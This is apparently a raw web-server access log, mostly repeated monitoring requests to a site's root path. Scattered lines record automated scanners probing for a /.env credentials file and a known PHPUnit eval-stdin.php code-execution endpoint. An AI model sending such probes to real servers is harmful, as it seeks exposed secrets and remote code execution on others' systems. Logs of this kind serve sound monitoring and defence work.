167.71.120.76 - - [15/Dec/2023:11:59:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 786 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:00:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 787 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:00:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 788 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:01:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 789 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:12:01:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 790 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:02:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 791 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:12:02:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 792 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:03:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 793 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:03:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 794 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:04:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 795 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:04:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 796 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:12:05:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 797 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:05:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 798 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:06:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 799 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:06:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 800 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:12:07:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 801 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:07:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 802 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:08:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 803 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:08:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 804 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:09:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 805 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:09:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 806 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:10:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 807 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:10:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 808 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:11:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 809 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:11:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 810 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:12:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 811 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:12:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 812 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:13:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 813 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:13:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 814 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:14:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 815 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:14:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 816 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:15:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 817 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:15:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 818 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:16:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 819 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:16:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 820 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:17:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 821 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:17:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 822 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:18:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 823 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:18:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 824 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:19:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 825 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:19:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 826 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:20:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 827 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:20:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 828 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:21:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 829 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:21:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 830 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:22:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 831 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:22:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 832 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:23:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 833 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:23:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 834 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:24:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 835 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:24:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 836 "www@docker" "http://172.28.0.10:80" 1ms
143.110.222.166 - - [15/Dec/2023:12:25:18 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 837 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:12:25:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 838 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:25:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 839 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:26:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 840 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:26:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 841 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:27:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 842 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:27:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 843 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:28:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 844 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:28:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 845 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:29:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 846 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:29:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 847 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:30:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 848 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:30:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 849 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:31:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 850 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:31:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 851 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:32:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 852 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:32:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 853 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:12:33:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 854 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:12:33:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 855 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:34:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 856 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:34:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 857 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:35:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 858 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:35:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 859 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:36:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 860 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:12:36:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 861 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:12:37:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 862 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:37:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 863 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:12:38:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 864 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:38:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 865 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:39:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 866 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:39:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 867 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:12:40:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 868 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:40:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 869 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:41:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 870 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:41:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 871 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:42:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 872 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:42:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 873 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:43:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 874 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:43:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 875 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:44:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 876 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:12:44:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 877 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:12:45:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 878 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:45:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 879 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:46:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 880 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:46:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 881 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:47:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 882 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:47:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 883 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:12:48:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 884 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:48:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 885 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:49:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 886 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:49:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 887 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:50:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 888 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:50:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 889 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:12:51:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 890 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:51:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 891 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:12:52:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 892 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:52:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 893 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:12:53:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 894 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:12:53:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 895 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:54:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 896 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:54:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 897 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:55:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 898 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:55:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 899 "www@docker" "http://172.28.0.10:80" 1ms
198.199.113.94 - - [15/Dec/2023:12:55:51 +0000] "GET /portal/redlion HTTP/1.1" 301 17 "-" "-" 900 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:12:56:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 901 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:56:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 902 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:57:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 903 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:57:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 904 "www@docker" "http://172.28.0.10:80" 0ms
143.110.222.166 - - [15/Dec/2023:12:57:54 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 905 "web-to-websecure@internal" "-" 0ms
107.170.250.36 - - [15/Dec/2023:12:58:22 +0000] "GET /portal/redlion HTTP/1.1" 301 17 "-" "-" 906 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:12:58:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 907 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:58:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 908 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:12:59:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 909 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:12:59:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 910 "www@docker" "http://172.28.0.10:80" 1ms
146.70.15.39 - - [15/Dec/2023:12:59:59 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 911 "web-to-websecure@internal" "-" 0ms
146.70.15.39 - - [15/Dec/2023:13:00:00 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 912 "web-to-websecure@internal" "-" 0ms
146.70.15.39 - - [15/Dec/2023:13:00:02 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 913 "-" "-" 0ms
146.70.15.39 - - [15/Dec/2023:13:00:04 +0000] "POST / HTTP/1.1" 404 19 "-" "-" 914 "-" "-" 0ms
146.70.15.39 - - [15/Dec/2023:13:00:06 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 17 "-" "-" 915 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:13:00:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 916 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:00:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 917 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:13:01:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 918 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:13:01:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 919 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:13:02:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 920 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:02:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 921 "www@docker" "http://172.28.0.10:80" 1ms
103.203.59.1 - - [15/Dec/2023:13:03:09 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 922 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:13:03:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 923 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:03:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 924 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:13:04:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 925 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:04:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 926 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:13:05:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 927 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:05:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 928 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:13:06:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 929 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:06:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 930 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:13:07:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 931 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:07:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 932 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:13:08:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 933 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:08:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 934 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:13:09:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 935 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:09:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 936 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:13:10:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 937 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:10:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 938 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:13:11:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 939 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:11:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 940 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:13:12:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 941 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:12:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 942 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:13:13:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 943 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:13:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 944 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:13:14:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 945 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:14:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 946 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:13:15:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 947 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:15:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 948 "www@docker" "http://172.28.0.10:80" 4ms
159.203.109.206 - - [15/Dec/2023:13:16:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 949 "www@docker" "http://172.28.0.10:80" 1ms
139.162.231.153 - - [15/Dec/2023:13:16:37 +0000] "GET / HTTP/2.0" 404 19 "-" "-" 950 "-" "-" 0ms
167.71.120.76 - - [15/Dec/2023:13:16:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 951 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:13:17:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 952 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:13:17:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 953 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:13:18:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 954 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:18:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 955 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:13:19:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 956 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:19:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 957 "www@docker" "http://172.28.0.10:80" 1ms
64.62.197.30 - - [15/Dec/2023:13:19:53 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 958 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:13:20:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 959 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:20:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 960 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:13:21:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 961 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:21:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 962 "www@docker" "http://172.28.0.10:80" 1ms
54.37.79.75 - - [15/Dec/2023:13:22:06 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 963 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [15/Dec/2023:13:22:06 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 964 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:13:22:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 965 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:22:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 966 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:13:23:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 967 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:13:23:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 968 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:13:24:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 969 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:13:24:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 970 "www@docker" "http://172.28.0.10:80" 1ms
